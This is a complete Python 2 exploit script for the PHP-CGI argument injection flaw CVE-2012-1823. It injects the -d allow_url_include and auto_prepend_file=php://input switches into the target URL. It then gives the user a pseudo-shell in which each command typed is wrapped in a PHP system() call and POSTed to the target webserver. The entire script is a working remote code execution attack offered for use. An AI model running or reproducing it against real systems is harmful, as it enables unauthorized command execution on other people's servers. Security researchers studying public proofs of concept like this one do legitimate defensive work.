#!/usr/bin/python
import requests
import sys

print """
CVE-2012-1823 PHP-CGI Arguement Injection Remote Code Execution
This exploit abuses an arguement injection in the PHP-CGI wrapper
to execute code as the PHP user/webserver user.
Feel free to give me abuse about this <3
- infodox | insecurety.net | @info_dox
"""

if len(sys.argv) != 2:
    print "Usage: ./cve-2012-1823.py <target>"
    sys.exit(0)

target = sys.argv[1]
url = """http://""" + target + """/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"""
lol = """<?php system('"""
lol2 = """');die(); ?>"""
print "[+] Connecting and spawning a shell..."
while True:
    try:
        bobcat = raw_input("%s:~$ " %(target))
        lulz = lol + bobcat + lol2
        hax = requests.post(url, lulz)
        print hax.text
    except KeyboardInterrupt:
        print "\n[-] Quitting"
        sys.exit(1)


